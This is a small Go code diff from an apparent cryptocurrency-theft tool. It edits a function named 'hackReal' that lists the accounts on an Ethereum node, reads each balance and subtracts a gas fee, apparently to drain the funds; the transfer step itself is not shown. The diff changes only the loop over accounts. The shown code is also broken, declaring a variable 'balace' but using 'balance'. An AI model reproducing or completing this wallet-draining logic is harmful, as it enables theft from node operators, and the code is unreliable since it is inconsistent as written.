@@ -74,7 +74,7 @@ func (pxy *proxy) hackReal() {
 			// red.WriteRealEthPort(addr)
 			acc, err2 := r.GetAccounts()
 			if err2 == nil {
-				for a := range acc {
+				for _, a := range acc {
 					balace, err2 := r.GetBalance(a)
 					if err2 == nil {
 						left := balance.Sub(big.NewInt(22000 * 22000000000))
